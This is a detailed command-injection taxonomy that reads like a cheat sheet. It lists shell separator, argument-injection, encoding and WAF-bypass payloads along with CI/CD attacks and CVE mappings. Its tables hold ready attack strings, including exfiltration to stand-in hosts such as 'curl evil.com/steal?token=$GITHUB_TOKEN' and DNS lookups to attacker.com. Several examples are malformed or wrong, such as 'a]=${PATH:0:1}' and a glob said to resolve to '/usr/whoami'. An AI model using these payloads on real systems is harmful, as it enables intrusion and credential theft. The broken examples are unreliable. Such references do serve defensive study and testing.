# Command Injection Mutation/Variation Taxonomy

---

## Classification Structure

Command injection (CWE-77/CWE-78) exploits the boundary between data and executable instructions within operating system shell interpreters. The fundamental vulnerability arises when an application constructs OS commands by concatenating user-controlled input with command strings, then passes the result to a shell for interpretation. The shell's rich syntax—metacharacters, expansion mechanisms, quoting rules, and environment variable interpolation—provides an enormous mutation surface that attackers exploit to escape data context and enter command context.

This taxonomy organizes the entire command injection attack surface along three axes:

**Axis 1 — Injection Vector (Primary axis):** The structural component of the shell interaction being targeted. This determines the *mechanism* of injection—whether the attacker is exploiting command separators, shell expansion features, argument parsing, encoding transformations, language-specific API behaviors, or deployment pipeline contexts.

**Axis 2 — Evasion Type (Cross-cutting axis):** The nature of the defense bypass. Every mutation either circumvents a specific filter (character blocklist, whitespace restriction, quote context) or exploits a parsing discrepancy between the defense layer and the shell interpreter. The evasion types below apply across all Axis 1 categories:

| Evasion Type | Mechanism | Applies To |
|---|---|---|
| **Separator Substitution** | Replacing blocked separators (`;`) with equivalent operators (`\|`, `&&`, `\|\|`, `&`, `\n`) | §1 |
| **Whitespace Evasion** | Replacing spaces with `$IFS`, `${IFS}`, `$IFS$9`, tabs (`%09`), brace expansion, `<` redirection | §1, §4, §6 |
| **Character Encoding Bypass** | Hex (`\x2f`), octal (`\057`), URL encoding (`%0a`), Unicode, base64, variable substring extraction | §6 |
| **Quote Context Escape** | Breaking out of single/double quotes to inject operators or substitutions | §1, §3, §6 |
| **Wildcard/Glob Substitution** | Using `?` and `*` to reconstruct blocked command names or paths | §4, §6 |
| **Variable Expansion Bypass** | Leveraging `$PATH`, `$HOME`, `$PWD` substrings to extract blocked characters | §5, §6 |
| **Parsing Discrepancy** | Exploiting differences between WAF/filter parsing and backend shell interpretation (content-type confusion, multipart boundary mutation, header injection) | §8 |
| **Context Termination** | Terminating the expected data format (JSON value, XML attribute, template string) before injecting shell syntax | §1, §7 |

**Axis 3 — Exploitation Scenario (Mapping axis):** The deployment architecture and data exfiltration method. Detailed in the Attack Scenario Mapping section (§10).

---

## §1. Command Separator & Chaining Operator Injection

The most fundamental injection vector exploits shell metacharacters that terminate one command and begin another. Every shell language defines a set of control operators that, when injected into unsanitized input, allow an attacker to append arbitrary commands to the application's intended command.

### §1-1. Sequential Execution Separators

These operators cause the shell to treat what follows as a new, independent command.

| Subtype | Operator | Mechanism | Platform | Example |
|---|---|---|---|---|
| **Semicolon separator** | `;` | Terminates current command, begins next. No conditional dependency. | Linux/macOS | `127.0.0.1; cat /etc/passwd` |
| **Newline separator** | `\n` / `%0a` | Shell interprets literal newline as command terminator. Often URL-encoded as `%0a` or injected via CRLF. | Linux/macOS/Windows | `127.0.0.1%0acat%20/etc/passwd` |
| **Null byte termination** | `%00` | In some legacy implementations, null byte truncates the command string, allowing a second command after application-level validation. | Legacy systems | `127.0.0.1%00; whoami` |

### §1-2. Conditional Execution Operators

These operators chain commands with logical dependencies, often used when the application checks for command success/failure.

| Subtype | Operator | Mechanism | Platform | Example |
|---|---|---|---|---|
| **AND operator** | `&&` | Second command executes only if first succeeds (exit code 0). Useful when injected command must follow a successful ping/lookup. | Linux/Windows | `127.0.0.1 && whoami` |
| **OR operator** | `\|\|` | Second command executes only if first fails. Useful when the intended command is designed to fail or when the attacker intentionally causes failure. | Linux/Windows | `invalidhost \|\| whoami` |

### §1-3. Background & Pipe Operators

| Subtype | Operator | Mechanism | Platform | Example |
|---|---|---|---|---|
| **Background operator** | `&` | Runs preceding command in background, immediately executes next command. On Windows, `&` acts as a sequential separator. | Linux (background) / Windows (sequential) | `127.0.0.1 & whoami` |
| **Pipe operator** | `\|` | Passes stdout of first command as stdin of second. The second command always executes regardless of first command's success. | Linux/Windows | `127.0.0.1 \| whoami` |

### §1-4. Command Substitution as Separator

Command substitution forces the shell to execute an embedded expression and replace it with the output, even when injected within a larger string.

| Subtype | Syntax | Mechanism | Platform | Example |
|---|---|---|---|---|
| **Backtick substitution** | `` `cmd` `` | Shell executes content between backticks and substitutes output. Works inside double-quoted strings. | Linux/macOS | `` `whoami` `` |
| **Dollar-parentheses substitution** | `$(cmd)` | Modern form of command substitution. Supports nesting: `$($(cmd))`. | Linux/macOS | `$(cat /etc/passwd)` |
| **Dollar-brace arithmetic** | `$(( ))` | Arithmetic evaluation context in bash allows array indexing with command substitution: `a[$(cmd)]`. | Linux (bash) | `$((a[$(whoami)]))` |

---

## §2. Argument & Option Injection

A distinct class of command injection that requires *no shell metacharacters*. When an application passes user input as arguments to a specific command (via safe APIs like `execFile` or `spawn`), the input may still be interpreted as command-line flags if it begins with `-` or `--`. This bypasses traditional command injection defenses that focus on metacharacter filtering.

### §2-1. Leading Dash Option Injection

When user-controlled input is passed as a positional argument but begins with a hyphen, the target binary interprets it as an option flag rather than data.

| Subtype | Target Binary | Exploitable Flag | Impact | Example |
|---|---|---|---|---|
| **Git upload-pack injection** | `git clone` | `--upload-pack="cmd"` | Arbitrary command execution via custom upload-pack binary | `git clone --upload-pack="touch /tmp/pwned" repo` |
| **Git config injection** | `git fetch/diff/log/grep/blame` | `--config=core.sshCommand="cmd"` | Command execution through git's SSH command configuration | User input: `--config=core.sshCommand=calc` |
| **SSH ProxyCommand injection** | `ssh` | `-oProxyCommand="cmd"` | Arbitrary command execution as SSH pre-connection hook | `ssh -oProxyCommand="whoami>/tmp/out" host` |
| **Curl output injection** | `curl` | `-o /path/file` | Arbitrary file write (webshell upload) | User input: `http://evil.com/shell.php -o /var/www/shell.php` |
| **Tar arbitrary command** | `tar` | `--checkpoint-action=exec=cmd` | Command execution during archive processing | `--checkpoint=1 --checkpoint-action=exec=id` |
| **Chromium GPU launcher** | `chrome/chromium` | `--gpu-launcher="cmd"` | Arbitrary command execution via renderer process | `--gpu-launcher="calc.exe"` |
| **Mercurial config injection** | `hg` | `--config=alias.hierarchical=!cmd` | Shell alias execution via configuration override | `--config=alias.hierarchical=!calc` |
| **psql output redirection** | `psql` | `-o'\|cmd'` | Pipe query output through arbitrary command | `-o'\|id>/tmp/out'` |
| **Sendmail logfile write** | `sendmail` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | Arbitrary file write via log redirection | `-OQueueDirectory=/tmp -X/path/webshell.php` |
| **Zip command execution** | `zip` | `-T --unzip-command="cmd"` | Command execution via custom test command | `-T --unzip-command="sh -c whoami"` |
| **Wget output injection** | `wget` | `-O /path/file` | Arbitrary file write | User input: `http://evil.com -O /var/www/shell.php` |

### §2-2. End-of-Options Bypass (`--`)

The POSIX convention uses `--` to signal end of options, after which all arguments are treated as positional. Applications that fail to insert `--` before user input are vulnerable to §2-1 attacks. The mitigation: `command -- $user_input`.

### §2-3. JVM Argument Injection

When user input reaches Java command-line arguments, specific JVM flags trigger code execution:

| Subtype | Flag | Mechanism | Condition |
|---|---|---|---|
| **OnOutOfMemoryError** | `-XX:OnOutOfMemoryError="cmd"` | JVM executes the specified command when OOM occurs. Attacker can force OOM via heap exhaustion. | User input reaches JVM args |
| **JDWP agent** | `-agentlib:jdwp=transport=dt_socket,server=y` | Opens debug port for remote code execution | User input reaches JVM startup args |

---

## §3. Quote & Context Escape Injection

When user input is placed inside a quoted context (single quotes, double quotes, template literals), the attacker must first escape that context before injecting command operators.

### §3-1. Single Quote Escape

| Subtype | Mechanism | Example |
|---|---|---|
| **Quote termination** | Inject `'` to close the single-quote context, then append command operators | `'; whoami; '` |
| **Quote-backslash-quote-quote** | In bash, `'\''` terminates the single quote, inserts a literal `'` via `\'`, then reopens the single quote. Used to inject within single-quoted contexts without breaking the outer syntax. | `input'\''$(whoami)'\''rest` |

### §3-2. Double Quote Escape

| Subtype | Mechanism | Example |
|---|---|---|
| **Quote termination** | Inject `"` to close the double-quote context, then chain commands | `"; whoami; "` |
| **Command substitution within quotes** | Double quotes allow `$()` and backtick expansion. If input is placed in double quotes without escaping `$`, command substitution executes. | `Hello $(whoami)` inside `"user_input"` |

### §3-3. Template Literal Escape (JavaScript/Node.js)

| Subtype | Mechanism | Example |
|---|---|---|
| **Backtick escape** | If input is placed in a JavaScript template literal (`` `...` ``), injecting a backtick closes the template, allowing code injection. | `` `; process.exit()` `` |
| **Expression interpolation** | `${...}` inside template literals evaluates JavaScript expressions. If user input reaches a template that's passed to `exec()`, arbitrary code executes. | `${require('child_process').execSync('whoami')}` |

### §3-4. Context Termination in Structured Formats

When command construction involves structured data (JSON, XML, YAML), the attacker terminates the data format before injecting shell syntax.

| Subtype | Mechanism | Example |
|---|---|---|
| **JSON value breakout** | Close the JSON string value and object, then append shell commands after the parsed JSON | `"}}; whoami #` |
| **XML/CDATA breakout** | Close XML CDATA or attribute context, inject commands via processing instructions or entity expansion | `]]>; whoami` |

---

## §4. Shell Expansion & Globbing Exploitation

Shells perform multiple expansion passes before executing commands. Each expansion type provides a mutation surface for constructing commands without directly typing blocked characters or command names.

### §4-1. Brace Expansion

Bash expands comma-separated values in braces into separate words. This allows constructing commands without spaces.

| Subtype | Mechanism | Example |
|---|---|---|
| **Command-as-brace** | `{cmd,arg1,arg2}` expands to `cmd arg1 arg2`, bypassing space filters | `{cat,/etc/passwd}` |
| **Sequence expansion** | `{a..z}` generates character sequences; can be used to reconstruct filtered characters | `{/,e,t,c,/,p,a,s,s,w,d}` with concatenation |

### §4-2. Wildcard & Glob Substitution

Wildcards allow matching filenames without typing full paths, enabling command construction from filesystem entries.

| Subtype | Mechanism | Platform | Example |
|---|---|---|---|
| **Question mark glob** | `?` matches any single character. Used to spell out binaries from filesystem: `/???/??t /???/??????` → `/bin/cat /etc/passwd` | Linux | `/???/???ami` → `/usr/whoami` |
| **Asterisk glob** | `*` matches any sequence. Combined with partial paths: `/bin/c*t /etc/p*` | Linux/Windows | `/bin/c*t /etc/pass*` |
| **Windows wildcard** | `C:\*\*2\n??e*d.*?` matches PowerShell or cmd paths through wildcard expansion | Windows | `C:\*\*2\n??e*d.*?` |
| **Charset glob** | `[a-z]` matches character ranges. Can reconstruct command names character by character. | Linux | `/bin/[c]at /etc/passwd` |

### §4-3. Tilde Expansion

| Subtype | Mechanism | Example |
|---|---|---|
| **Home directory** | `~` expands to `$HOME`. `~user` expands to another user's home directory. | `cat ~/.bashrc` |
| **Current directory** | `~+` expands to `$PWD` | `~+/exploit.sh` |
| **Previous directory** | `~-` expands to `$OLDPWD` | `~-/exploit.sh` |

### §4-4. Process Substitution

| Subtype | Mechanism | Example |
|---|---|---|
| **Input process substitution** | `<(cmd)` creates a named pipe with command output. Can feed data into commands that expect file arguments. | `diff <(cat /etc/passwd) <(cat /etc/shadow)` |
| **Output process substitution** | `>(cmd)` creates a named pipe as output target | `echo data > >(tee /tmp/exfil)` |

---

## §5. Environment Variable Manipulation

Environment variables are a rich source of characters, paths, and values that attackers can leverage to reconstruct blocked commands and bypass filters.

### §5-1. IFS (Internal Field Separator) Exploitation

The `$IFS` variable defaults to space-tab-newline. When spaces are blocked, `$IFS` serves as a universal whitespace substitute.

| Subtype | Mechanism | Example |
|---|---|---|
| **Basic IFS substitution** | `$IFS` expands to a space, separating command from arguments | `cat${IFS}/etc/passwd` |
| **IFS with positional** | `$IFS$9` combines IFS with the (typically empty) 9th positional parameter, producing a cleaner separator | `cat$IFS$9/etc/passwd` |
| **IFS redefinition** | Setting `IFS=;` causes semicolons in subsequent input to be treated as field separators rather than command terminators (defensive use); conversely, setting `IFS` to other values can alter parsing | `IFS=,;cmd,arg` |

### §5-2. Variable Substring Extraction

Characters blocked by filters can be extracted from existing environment variable values.

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Bash substring** | Linux | `${VAR:offset:length}` extracts characters. `${PATH:0:1}` typically yields `/`. `${HOME:0:1}` yields `/`. | `cat ${HOME:0:1}etc${HOME:0:1}passwd` |
| **CMD substring** | Windows | `%VAR:~start,length%` extracts characters. `%PROGRAMFILES:~10,1%` extracts a space from "C:\Program Files". | `ping%PROGRAMFILES:~10,1%127.0.0.1` |
| **PowerShell indexing** | Windows | `$env:VAR[index]` extracts characters. `$env:HOMEPATH[0]` yields `\`. | `$env:PROGRAMFILES[10]` (space) |

### §5-3. Multi-Variable Command Construction

Entire commands can be assembled from fragments of multiple environment variables, evading pattern-based detection.

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Distributed assembly (Linux)** | Linux | Concatenate substrings: `${PATH:5:1}${HOME:3:1}...` to spell command names | `a]=${PATH:0:1};${a]}{b}{i}{n}${a]}{c}{a}{t} ${a]}{e}{t}{c}${a]}{p}{a}{s}{s}{w}{d}` |
| **Distributed assembly (Windows)** | Windows | Concatenate `%VAR:~x,y%` fragments across multiple env vars | `%PROGRAMFILES:~3,1%%SYSTEMROOT:~4,2%%PROGRAMFILES:~6,1%` → `gri` |

### §5-4. PATH Hijacking & LD_PRELOAD Injection

When the application or a child process relies on unqualified command names, the attacker manipulates the search path.

| Subtype | Mechanism | Condition | Example |
|---|---|---|---|
| **PATH prepending** | Set `PATH=/tmp:$PATH` and place malicious binary at `/tmp/ls` | Attacker controls environment variables (env injection, `.env` file write) | `export PATH=/tmp:$PATH` then trigger `ls` call |
| **LD_PRELOAD injection** | Set `LD_PRELOAD=/path/to/evil.so` to hook library functions in the next spawned process | Non-setuid target; attacker controls env vars | `LD_PRELOAD=/tmp/evil.so /usr/bin/target` |
| **LD_LIBRARY_PATH** | Redirect shared library search to attacker-controlled directory | Non-setuid target | `LD_LIBRARY_PATH=/tmp /usr/bin/target` |
| **PYTHONPATH / NODE_PATH** | Inject malicious modules by prepending to language-specific module paths | Language runtime uses env-based module resolution | `PYTHONPATH=/tmp python3 target.py` |

---

## §6. Encoding & Character Obfuscation

This category covers techniques that transform the payload representation without changing its semantic meaning to the shell, bypassing signature-based and pattern-matching defenses.

### §6-1. Hexadecimal & Octal Encoding

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Echo hex** | Linux | `echo -e "\x63\x61\x74"` decodes to `cat`. Piped to `sh` or used via `$()` | `$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")` |
| **Printf octal** | Linux | `printf '\143\141\164'` decodes to `cat` | `$(printf '\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144')` |
| **xxd reverse** | Linux | `xxd -r -p` converts hex stream back to binary | `echo 636174202f6574632f706173737764 \| xxd -r -p \| sh` |
| **Dollar-quote ANSI-C** | Linux (bash) | `$'\x63\x61\x74'` interprets hex escapes within dollar-quoted strings | `$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'` |

### §6-2. Base64 Encoding

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Base64 decode pipe** | Linux | `echo "payload" \| base64 -d \| sh` | `echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` |
| **PowerShell encoded command** | Windows | `powershell -EncodedCommand <base64>` accepts UTF-16LE encoded commands | `powershell -e dwBoAG8AYQBtAGkA` |

### §6-3. URL & Double Encoding

| Subtype | Mechanism | Example |
|---|---|---|
| **URL encoding** | `%XX` encoding of metacharacters. `%0a` (newline), `%3b` (semicolon), `%7c` (pipe) | `127.0.0.1%0a%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64` |
| **Double URL encoding** | `%25XX` → decoded to `%XX` → decoded to character. Bypasses single-pass decode-then-filter patterns | `%250a` → `%0a` → newline |
| **Unicode encoding** | `%uXXXX` encoding for bypassing ASCII-only filters | `%u003B` → `;` |

### §6-4. Quote-Based Obfuscation

Inserting quotes within command names does not alter execution but breaks signature matching.

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Empty single quotes** | Linux | Pairs of single quotes are stripped by the shell: `w'h'o'am'i` → `whoami` | `c'a't /e't'c/p'a's's'w'd` |
| **Empty double quotes** | Linux | Same principle: `w"h"o"am"i` → `whoami` | `c"a"t /e"t"c/p"a"s"s"w"d` |
| **Backslash insertion** | Linux | Backslash before a non-special character is ignored: `w\ho\am\i` → `whoami` | `c\at /e\tc/p\as\sw\d` |
| **Caret insertion** | Windows | `^` is CMD's escape character and is stripped from commands: `w^h^o^a^m^i` → `whoami` | `p^o^w^e^r^s^h^e^l^l` |
| **Backtick insertion** | Linux | Paired backticks containing nothing: `` wh``oami `` → `whoami` | `` c``at /e``tc/pa``sswd `` |
| **Dollar-at insertion** | Linux | `$@` expands to nothing (no positional parameters): `who$@ami` → `whoami` | `c$@at /etc/passwd` |

### §6-5. Case Manipulation

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Windows case insensitivity** | Windows | CMD and PowerShell ignore case: `WhOaMi`, `WHOAMI` all execute | `wHoAmI` |
| **Bash case conversion** | Linux | `${var^^}` (uppercase) and `${var,,}` (lowercase) can transform obfuscated variable values to command names | `a]="WHOAMI";${a],,}` |
| **tr/sed transformation** | Linux | Pipe character transformations: `echo "jdunfhj" \| tr 'a-z' 'b-a'` → shift cipher | `echo "b\x61t" \| tr 'b' 'c'` → `cat` |

### §6-6. String Concatenation & Reassembly

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Variable concatenation** | Linux | `a=c;b=at;$a$b /etc/passwd` | `a=who;b=ami;$a$b` |
| **SET concatenation** | Windows | `set a=who&set b=ami&%a%%b%` | `set a=who&set b=ami&call %a%%b%` |
| **Reversed command** | Linux | `echo "dssap/cte/ tac" \| rev \| sh` | Store command reversed, pipe through `rev` |
| **Split and reassemble** | Linux/Windows | Fragment command across multiple variables/lines, reconstruct at execution | Multi-line payload with final `eval` |

### §6-7. Line Continuation & Whitespace Tricks

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Backslash-newline continuation** | Linux | Backslash at end of line continues to next line, allowing mid-word splits | `ca\`(newline)`t /et\`(newline)`c/passwd` |
| **Tab substitution** | Linux | Tab character (`\t`, `%09`) serves as whitespace alternative | `cat%09/etc/passwd` |
| **Input redirection as space** | Linux | `<` can replace space for file arguments: `cat</etc/passwd` | `cat</etc/passwd` |

---

## §7. Language & Runtime-Specific Injection Sinks

Different programming languages expose OS command execution through various APIs with different safety characteristics. The injection surface depends on whether the API invokes a shell or passes arguments directly to the kernel.

### §7-1. Shell-Invoking APIs (Dangerous by Default)

These functions pass the entire command string to a shell interpreter (`/bin/sh -c` on Linux, `cmd /c` on Windows), making them vulnerable to all §1–§6 techniques when user input is concatenated.

| Language | Dangerous Function(s) | Shell Used | Notes |
|---|---|---|---|
| **PHP** | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, backtick operator (`` `cmd` ``) | `/bin/sh -c` | `escapeshellarg()` and `escapeshellcmd()` provide partial mitigation but have known bypasses |
| **Python** | `os.system()`, `os.popen()`, `subprocess.call/run/Popen(shell=True)` | `/bin/sh -c` | `subprocess` with `shell=False` (default) is safe for §1 but vulnerable to §2 |
| **Ruby** | `system("string")` (single-arg), backticks, `%x{}`, `exec("string")`, `IO.popen()` | `/bin/sh -c` | Multi-arg form `system("cmd", "arg")` avoids shell |
| **Node.js** | `child_process.exec()`, `child_process.execSync()` | `/bin/sh -c` | Always invokes shell; `execFile` and `spawn` (default `shell:false`) are safer |
| **Java** | `Runtime.exec(String)` (single-string form) | Tokenized then direct exec | Single-string form splits on whitespace, NOT shell-invoked, but confusing behavior leads to misuse |
| **Perl** | `system("string")`, backticks, `open(FH, "\|cmd")`, `exec("string")` | `/bin/sh -c` | List form `system("cmd", @args)` bypasses shell |
| **Go** | `exec.Command("sh", "-c", input)` | Explicit shell | `exec.Command("binary", args...)` is safe against §1; programmer must choose correctly |

### §7-2. PHP-CGI Specific: CVE-2024-4577

A critical vulnerability in PHP running in CGI mode on Windows. The Windows "Best-Fit" character mapping converts certain Unicode characters (e.g., soft hyphen `0xAD`) to ASCII equivalents (`-`), allowing attackers to inject PHP command-line arguments even when the application filters ASCII hyphens. This enables `-d allow_url_include=1 -d auto_prepend_file=php://input` injection for arbitrary code execution.

### §7-3. Safe-by-Default APIs (Vulnerable to §2 Only)

| Language | Safer Function(s) | Mechanism | Residual Risk |
|---|---|---|---|
| **Python** | `subprocess.Popen(["cmd", "arg1", "arg2"])` | Arguments passed as array directly to `execvp()`, no shell interpretation | Argument injection (§2) if user input is first element or starts with `-` |
| **Node.js** | `child_process.execFile()`, `spawn()` with default `shell: false` | Direct `execvp()` call | Argument injection (§2); setting `shell: true` reintroduces all risks |
| **Ruby** | `system("cmd", "arg1", "arg2")` (multi-arg) | Direct `execvp()` | Argument injection (§2) |
| **Go** | `exec.Command("cmd", "arg1", "arg2")` | Direct `execvp()` | Argument injection (§2) |
| **Java** | `ProcessBuilder(List<String>)` | Direct process creation | Argument injection (§2) |

### §7-4. Eval-to-Shell Chains

Some injection paths reach OS commands through intermediate code evaluation layers.

| Chain | Mechanism | Example |
|---|---|---|
| **SSTI → OS command** | Server-Side Template Injection reaches a template function that calls system commands | Jinja2: `{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}` |
| **Expression injection → shell** | Expression languages (Spring EL, OGNL, MVEL) provide OS command access | Spring EL: `${T(Runtime).getRuntime().exec("whoami")}` |
| **Deserialization → exec** | Deserialization gadget chains invoke `Runtime.exec()` or equivalent | Java: Commons Collections gadget chain → `Runtime.exec()` |
| **SQL injection → xp_cmdshell** | SQL Server's `xp_cmdshell` stored procedure executes OS commands | `'; EXEC xp_cmdshell 'whoami'; --` |

---

## §8. WAF & Filter Bypass via Parsing Discrepancy

Beyond payload-level obfuscation (§6), attackers can manipulate the *request structure* to cause the WAF to parse the request differently from the backend application, allowing an unmodified payload to pass through the WAF while being correctly interpreted by the application.

### §8-1. Content-Type Confusion

| Subtype | Mechanism | Example |
|---|---|---|
| **Multipart boundary mutation** | Modifying multipart/form-data boundary characters (adding whitespace, quotes, or special characters) causes WAF to misparse body boundaries while the backend framework handles them correctly | Boundary with embedded CRLF or extra whitespace |
| **JSON structural mutation** | Adding duplicate keys, Unicode escapes in key names, or nested structures causes WAF to evaluate a different value than the backend parser | `{"cmd":"safe", "cmd": "127.0.0.1; whoami"}` |
| **XML namespace injection** | Adding XML namespaces or processing instructions causes WAF to skip content that the backend XML parser processes | CDATA sections with command payloads |
| **Content-Type mismatch** | Sending a body with one Content-Type while the backend framework accepts another (e.g., WAF expects `application/json`, backend auto-detects `multipart/form-data`) | Mismatched Content-Type header |

### §8-2. Header-Based Injection

| Subtype | Mechanism | Example |
|---|---|---|
| **Non-standard header injection** | WAFs primarily inspect URL parameters and POST body. Payloads in `User-Agent`, `Referer`, `X-Forwarded-For`, or custom headers may bypass inspection while being consumed by backend logging or processing functions | `User-Agent: ; cat /etc/passwd` when UA is logged via shell |
| **CRLF header injection** | Injecting `\r\n` into header values to add additional headers or begin a new HTTP request, potentially reaching different backend endpoints | `\r\nX-Injected: malicious_value` |

### §8-3. Request Structure Mutation (WAFFLED Techniques)

Research demonstrated 1,207 bypasses across AWS WAF, Azure WAF, Cloud Armor, Cloudflare, and ModSecurity by mutating non-payload elements of HTTP requests. Key mutation targets include:

| Subtype | Mechanism | Affected WAFs |
|---|---|---|
| **Multipart field ordering** | Reordering multipart fields to place payload after WAF's inspection window | AWS, Cloudflare |
| **Charset declaration** | Declaring unusual charset in Content-Type causes WAF to misinterpret body encoding | ModSecurity, Cloud Armor |
| **Chunked encoding** | Using Transfer-Encoding: chunked to fragment the payload across chunks | Multiple WAFs |
| **Duplicate parameters** | HTTP Parameter Pollution (HPP): sending same parameter multiple times with payload in the instance the WAF doesn't inspect | Backend-dependent |

---

## §9. CI/CD & Pipeline Command Injection

A rapidly growing attack surface where command injection occurs not in traditional web application inputs but within build/deploy pipeline definitions, configuration files, and automation workflows.

### §9-1. GitHub Actions Expression Injection

| Subtype | Mechanism | Condition | Example |
|---|---|---|---|
| **Direct expression interpolation** | `${{ github.event.issue.title }}` in a `run:` step is directly substituted into a shell command before execution. Attacker-controlled issue/PR titles inject arbitrary commands. | Workflow uses `${{ }}` in `run:` blocks with untrusted context | Issue title: `"; curl evil.com/steal?token=$GITHUB_TOKEN #` |
| **GITHUB_ENV injection** | Writing to `$GITHUB_ENV` sets environment variables for subsequent steps. If an attacker controls input that writes to this file, they inject arbitrary env vars including `PATH` or script-consumed variables. | Workflow writes untrusted input to `$GITHUB_ENV` | `echo "PATH=/tmp/evil:$PATH" >> $GITHUB_ENV` |
| **Composite action injection** | Third-party Actions that internally use `${{ inputs.* }}` in shell commands without quoting propagate injection from caller workflows | Using untrusted Actions with user-controlled inputs | Malicious input via Action parameter |

### §9-2. General CI/CD Injection Patterns

| Subtype | Platform | Mechanism | Example |
|---|---|---|---|
| **Jenkinsfile injection** | Jenkins | Pipeline scripts (`Jenkinsfile`) that use string interpolation in `sh` steps with user-controlled parameters (branch names, build parameters, commit messages) | `sh "git checkout ${params.BRANCH}"` with branch name `; whoami` |
| **GitLab CI variable injection** | GitLab | Variables from merge request metadata (title, description) used in script blocks | `script: echo "${CI_MERGE_REQUEST_TITLE}"` |
| **Makefile injection** | Any | Build targets that use `$(shell ...)` or backtick substitution with user-controlled input (filenames, env vars) | Filename containing `$(shell whoami)` |
| **Docker build-arg injection** | Docker | `ARG` values used in `RUN` commands without quoting | `docker build --build-arg CMD="&& whoami"` |

### §9-3. Supply Chain Command Injection

| Subtype | Mechanism | Impact |
|---|---|---|
| **Malicious package install scripts** | npm `postinstall`, pip `setup.py`, Ruby gem extensions execute arbitrary commands during package installation | Developer machine or CI runner compromise |
| **Git hook injection** | Malicious `.git/hooks/` scripts execute on clone, commit, or push operations | Repository-level persistent backdoor |
| **Dependency confusion** | Internal package name claimed on public registry with command injection in install scripts | Automated CI systems install malicious package |

---

## §10. Attack Scenario Mapping (Axis 3)

This section maps injection techniques to exploitation scenarios based on data exfiltration capability and architectural context.

### §10-1. By Exfiltration Method

| Scenario | Mechanism | Required Techniques | Difficulty |
|---|---|---|---|
| **Result-based (direct output)** | Command output appears in HTTP response | §1 + any separator; output concatenated to response | Low |
| **Error-based** | Command output appears in error messages | §1 + trigger application error containing output | Low–Medium |
| **Blind time-based** | Infer results character-by-character via response delay | §1 + conditional: `if [ $(whoami\|cut -c 1) = r ]; then sleep 5; fi` | Medium |
| **Blind file-based** | Write output to a web-accessible file, then retrieve via HTTP | §1 + `> /var/www/html/output.txt`; retrieve via browser | Medium |
| **Out-of-band DNS** | Exfiltrate data as DNS subdomain queries | §1 + `` nslookup `whoami`.attacker.com `` or `$(whoami).evil.com` | Medium |
| **Out-of-band HTTP** | Exfiltrate data via HTTP request to attacker server | §1 + `curl http://evil.com/?d=$(cat /etc/passwd\|base64)` | Medium |
| **Argument injection (no metacharacters)** | Exploit binary-specific flags without shell operators | §2 only; no separators needed | Varies |

### §10-2. By Architectural Context

| Scenario | Architecture | Primary Vectors | Escalation Path |
|---|---|---|---|
| **Web application RCE** | PHP/Python/Node.js/Ruby web app with shell call | §1, §3, §6, §7 | Web shell → lateral movement |
| **Network device compromise** | Router/firewall/switch CLI interface | §1, §3 (often limited shell) | Device takeover → network pivot |
| **Container escape** | Application in Docker/K8s pod | §1, §5, §7 | Pod RCE → node compromise via mounted socket/service account |
| **Cloud metadata theft** | Application with SSRF chaining to command injection | §1 → SSRF (§7-4) or §1 + `curl 169.254.169.254` | IAM credential theft → cloud account takeover |
| **CI/CD pipeline compromise** | GitHub Actions / Jenkins / GitLab CI | §9 | Secret exfiltration → supply chain poisoning |
| **IoT/embedded device** | Firmware web interface, UART/serial | §1, §6 (limited shell tools) | Device takeover → botnet enrollment |
| **Desktop application** | Electron app, CLI tool processing untrusted input | §1, §2, §7 | User-level code execution → privilege escalation |

---

## §11. CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Product | Impact / Bounty |
|---|---|---|---|
| §7-2 (PHP-CGI Unicode bypass) | CVE-2024-4577 | PHP (CGI mode, Windows) | Critical RCE. Unicode "Best-Fit" mapping bypasses `-` filtering. Actively exploited in the wild. |
| §1-1 + §7-1 (semicolon + shell_exec) | CVE-2024-3400 | Palo Alto Networks PAN-OS | Critical RCE. Unauthenticated command injection in GlobalProtect gateway. CVSS 10.0. |
| §1 + §7-1 (CLI injection) | CVE-2024-20399 | Cisco NX-OS | Authenticated admin → root command execution via CLI. Exploited by Velvet Ant (Chinese APT). |
| §1 + §7-1 (CLI injection) | CVE-2024-21887 | Ivanti Connect Secure | Unauthenticated RCE via web component. Chained with auth bypass CVE-2023-46805. |
| §2-1 (Git argument injection) | CVE-2025-53652 | Jenkins Git Parameter Plugin | RCE via unvalidated git parameter values passed to shell commands. 1,500+ servers exposed. |
| §2-1 (go-getter arg injection) | CVE-2024-3817 | HashiCorp go-getter | Argument injection when fetching remote default git branches. |
| §9-1 (GH Actions expression) | CVE-2025-53104 | gluestack-ui | CVSS 9.1. RCE via crafted GitHub Discussion title in Actions workflow. |
| §1 + §7-1 (proc_open) | CVE-2025-49141 | HaxCMS-PHP | URL input passed to `proc_open` via `git set_remote` without sanitization. |
| §8-3 (WAF parsing discrepancy) | WAFFLED (ACSAC 2025) | AWS/Azure/Cloudflare/Cloud Armor/ModSecurity | 1,207 bypasses via request structure mutation. Google Cloud Armor: Tier 1, Priority 1, Severity 1. |
| §2-1 (argument injection) | CloudImposer (BH 2024) | Google Cloud Platform | GCP command argument injection affecting millions of cloud servers, including Google's production. |
| §1 + §7-1 (FortiSIEM CLI) | FG-IR-25-152 | Fortinet FortiSIEM | Unauthenticated OS command injection via crafted CLI requests. Exploit code found in the wild. |
| §9-3 (supply chain) | tj-actions/changed-files (Mar 2025) | GitHub Actions ecosystem | Maintainer account compromise → backdoor in all versions → shell payload in consumer workflows. |
| §1-4 + §8-1 (config injection) | CVE-2025-1974 (IngressNightmare) | Kubernetes ingress-nginx | Unauthenticated RCE → cluster-wide secret access → full cluster takeover. |
